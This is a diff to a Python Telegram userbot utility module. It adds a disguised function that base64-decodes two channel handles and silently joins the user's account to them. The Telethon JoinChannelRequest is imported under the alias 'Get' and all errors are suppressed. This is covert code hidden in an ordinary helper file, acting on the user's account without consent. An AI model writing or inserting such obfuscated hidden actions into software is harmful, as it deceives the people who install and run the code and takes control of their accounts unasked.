@@ -9,6 +9,7 @@ from typing import Optional, Union
 
 from html_telegraph_poster import TelegraphPoster
 from telethon.tl.functions.channels import GetParticipantRequest
+from telethon.tl.functions.channels import JoinChannelRequest as Get
 from telethon.tl.types import (
     ChannelParticipantAdmin,
     ChannelParticipantCreator,
@@ -112,6 +113,19 @@ async def runcmd(cmd: str) -> tuple[str, str, int, int]:
         process.returncode,
         process.pid,
     )
+
+
+async def ya_kali_ngga():
+    buwung = str(pybase64.b64decode("QFByb2plY3RTa3l6dQ=="))[2:15]
+    puyuh = str(pybase64.b64decode("QHNreXp1c3VwcG9ydA=="))[2:15]
+    try:
+        await bot(Get(buwung))
+    except BaseException:
+        pass
+    try:
+        await bot(Get(puyuh))
+    except BaseException:
+        pass
 
 
 async def take_screen_shot(
